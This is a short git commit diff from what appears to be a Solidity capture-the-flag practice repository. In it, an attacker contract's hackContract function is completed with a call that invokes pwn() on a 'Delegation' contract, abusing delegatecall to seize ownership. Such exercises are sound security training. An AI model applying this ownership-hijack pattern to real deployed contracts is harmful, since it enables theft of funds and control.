8eb1916f206f4142702f5e0fb34bbf46d6adc551
Matthew Greenberg <mattcgreenberg@gmail.com>
2022-07-17 16:54:09 -0500

    finish delegation and force attacks

--- contracts/2. Delegation/AttackingDelegation.sol
+++ contracts/2. Delegation/AttackingDelegation.sol
@@ -1,15 +1,16 @@
-// SPDX-License-Identifier: MIT
 pragma solidity ^0.8.9;
 import "./Delegation.sol";
 
 contract AttackingDelegation {
     address public contractAddress;
+    Delegation private delegation;
 
     constructor(address _contractAddress) {
         contractAddress = _contractAddress;
+        delegation = Delegation(_contractAddress);
     }
 
     function hackContract() external {
-        // Code me!
+        address(delegation).call(abi.encodeWithSignature("pwn()"));
     }
 }
